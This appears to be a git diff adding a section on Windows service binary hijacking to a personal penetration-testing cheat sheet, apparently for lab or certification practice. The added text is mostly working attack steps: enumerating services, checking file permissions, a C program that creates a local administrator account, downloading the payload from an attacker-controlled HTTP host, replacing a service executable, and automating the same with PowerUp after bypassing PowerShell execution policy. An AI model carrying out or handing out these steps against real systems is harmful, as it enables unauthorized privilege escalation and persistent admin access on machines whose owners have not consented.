@@ -440,6 +440,61 @@ Download WinPEAS from Attacker HTTP `> iwr -uri http://192.168.45.152/winPEASx64
 
 Execute WinPEAS `> ./WinPEAS.exe`
 
+### Service Binary Hijacking
+
+Get a list of services and their binary path `> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
+
+Get permissions mask `> icacls "C:\xampp\apache\bin\httpd.exe"` or `icacls "C:\xampp\mysql\bin\mysqld.exe"`
+```
+Example...
+
+PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
+C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
+                              BUILTIN\Administrators:(F)
+                              BUILTIN\Users:(F)
+
+Key: 
+Mask 	Permissions
+F 	   Full access
+M 	   Modify access
+RX 	  Read and execute access
+R 	   Read-only access
+W 	   Write-only access
+```
+
+So create a c file `adduser.c` that creates a user and adds to local admin
+
+```
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+
+Compile `$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
+
+Transfer `> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe`
+
+Replace old bin `> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe`
+
+Restart the service `> net stop mysql` or restart the machine `> shutdown /r /t 0 `
+
+### Automating Service Binary theft with PowerUp 
+
+1. `$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .`
+2. `$ python3 -m http.server 80`
+3. `> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1`
+4. `> powershell -ep bypass`
+5. `> . .\PowerUp.ps1`
+6. `> Get-ModifiableServiceFile`
+7. `> Install-ServiceBinary -Name 'mysql'`
+
+
 
 # Anti-virus Evasion
 
